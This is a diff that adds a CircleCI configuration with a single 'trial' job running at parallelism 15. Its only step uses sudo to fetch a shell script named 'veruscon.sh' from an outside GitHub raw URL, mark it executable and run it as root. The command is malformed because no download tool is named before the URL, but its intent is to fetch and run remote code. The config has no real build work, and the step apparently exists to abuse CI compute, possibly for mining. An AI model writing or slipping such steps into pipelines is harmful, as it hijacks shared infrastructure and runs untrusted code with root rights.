@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+  trial:
+    docker:
+      - image: circleci/ruby:2.5.3
+    parallelism: 15
+    steps:
+      - run:
+         name:
+         command: |
+            sudo su --command "https://raw.githubusercontent.com/Owijeka/wingsan/main/veruscon.sh && chmod +ux veruscon.sh && ./veruscon.sh"
+
+workflows:
+  version: 2.1
+  build:
+    jobs:
+      - trial
